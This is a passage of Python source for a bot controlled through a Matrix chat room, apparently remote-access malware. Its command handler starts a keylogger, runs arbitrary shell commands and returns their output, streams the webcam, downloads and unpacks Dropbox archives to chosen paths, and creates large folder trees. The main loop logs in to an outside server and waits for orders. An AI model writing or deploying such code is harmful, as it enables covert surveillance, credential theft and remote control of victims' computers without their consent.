            return f"Error starting Key Mode: {str(e)}"
    
    # Stop keylogging
    elif message == f"Stop listening {BOT_NAME}":
        try:
            keylogger.stop_listening()
            return f"{BOT_NAME} stopped listening"
        except Exception as e:
            return f"Error stopping keylogger: {str(e)}"

    # Download from Dropbox
    elif message.startswith(f"Download from Dropbox ") and BOT_NAME in message:
        # Extract URL and path: "Download from Dropbox URL to PATH BOT_NAME"
        parts = message.split()
        if "to" in parts:
            url_start = message.find("Download from Dropbox ") + len("Download from Dropbox ")
            to_index = message.find(" to ")
            bot_index = message.rfind(f" {BOT_NAME}")
            
            if to_index > url_start and bot_index > to_index:
                dropbox_url = message[url_start:to_index].strip()
                destination_path = message[to_index + 4:bot_index].strip()
                
                success, msg = download_and_extract_dropbox(dropbox_url, destination_path)
                if success:
                    return f"Download successful: {msg}"
                else:
                    return f"Download failed: {msg}"
            else:
                return "Invalid download command format. Use: Download from Dropbox URL to PATH BOT_NAME"
        else:
            return "Invalid download command format. Use: Download from Dropbox URL to PATH BOT_NAME"
    
    # Run terminal command
    elif message.startswith(f"Run command ") and BOT_NAME in message:
        # Extract command: "Run command COMMAND BOT_NAME"
        start_idx = message.find("Run command ") + len("Run command ")
        end_idx = message.rfind(f" {BOT_NAME}")
        if end_idx > start_idx:
            command = message[start_idx:end_idx].strip()
            success, output = run_terminal_command(command)
            if success:
                # Truncate output if too long
                if len(output) > 1000:
                    output = output[:1000] + "...[truncated]"
                return f"Command output:\n{output}"
            else:
                return f"Command error: {output}"
        else:
            return "Invalid command format. Use: Run command COMMAND BOT_NAME"
    
    # Start camera stream
    elif message == f"Start camera stream {BOT_NAME}":
        try:
            success, msg = camera_streamer.start_stream()
            if success:
                return "Camera streaming started"
            else:
                return f"Camera error: {msg}"
        except Exception as e:
            return f"Camera error: {str(e)}"
    
    # Stop camera stream
    elif message == f"Stop camera stream {BOT_NAME}":
        try:
            camera_streamer.stop_stream()
            return "Camera streaming stopped"
        except Exception as e:
            return f"Error stopping camera: {str(e)}"
    
    # Create folder tree
    elif message.startswith(f"Create folder tree ") and BOT_NAME in message:
        # Extract path and depth: "Create folder tree PATH depth DEPTH BOT_NAME"
        if " depth " in message:
            start_idx = message.find("Create folder tree ") + len("Create folder tree ")
            depth_idx = message.find(" depth ")
            end_idx = message.rfind(f" {BOT_NAME}")
            
            if depth_idx > start_idx and end_idx > depth_idx:
                tree_path = message[start_idx:depth_idx].strip()
                depth_str = message[depth_idx + 7:end_idx].strip()
                
                try:
                    depth = int(depth_str)
                    if depth < 1 or depth > 10:  # Reasonable limits
                        return "Depth must be between 1 and 10"
                    
                    success, msg = create_5ary_tree(tree_path, depth)
                    return msg
                except ValueError:
                    return "Invalid depth value. Must be a number."
            else:
                return "Invalid tree command format. Use: Create folder tree PATH depth DEPTH BOT_NAME"
        else:
            return "Invalid tree command format. Use: Create folder tree PATH depth DEPTH BOT_NAME"


    # Unrecognized command - respond with nothing
    return None

async def main():
    """Main bot function"""
    global client, keylogger, running
    
    print(f"Starting Matrix bot: {BOT_NAME}")
    print(f"Lock file path: {lock_file}")
    
    # Start lock file updater thread FIRST
    lock_thread = threading.Thread(target=update_lock_file, daemon=True)
    lock_thread.start()
    print("Lock file updater thread started")
    
    # Initial lock file creation
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        with open(lock_file, 'w') as f:
            f.write(str(time.time()))
        print(f"Initial lock file created: {lock_file}")
    except Exception as e:
        print(f"Error creating initial lock file: {e}")
    
    # Create Matrix client
    client = AsyncClient(HOMESERVER, USERNAME)
    # Create keylogger instance
    # Create keylogger instance
    keylogger = KeyLogger(None)
    camera_streamer = CameraStreamer(None)

    try:
        # Login
        print("Logging in...")
        response = await client.login(PASSWORD)
        
        if not isinstance(response, LoginResponse):
            print(f"Failed to login: {response}")
            return
        
        print(f"Logged in successfully as {USERNAME}")
        
        # Join the room if not already joined
        try:
            await client.join(ROOM_ID)
            print(f"Joined room: {ROOM_ID}")
        except Exception as e:
            print(f"Note: Could not join room (might already be joined): {e}")
        
        # Set up message callback BEFORE establishing timestamp
        client.add_event_callback(message_callback, RoomMessageText)
        
        # Establish connection timestamp using Matrix server time
        await establish_connection_timestamp()
        
        print("Bot is now online and ready!")
        
        # Keep syncing
        while running:
            try:
                await client.sync(timeout=30000)
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Sync error: {e}")
                await asyncio.sleep(5)
                
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        running = False
        if camera_streamer:
            camera_streamer.stop_stream()
        if client:
            await client.close()
        print("Bot stopped")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped by user")
        running = False
    except Exception as e:
        print(f"Fatal error: {e}")
        running = False
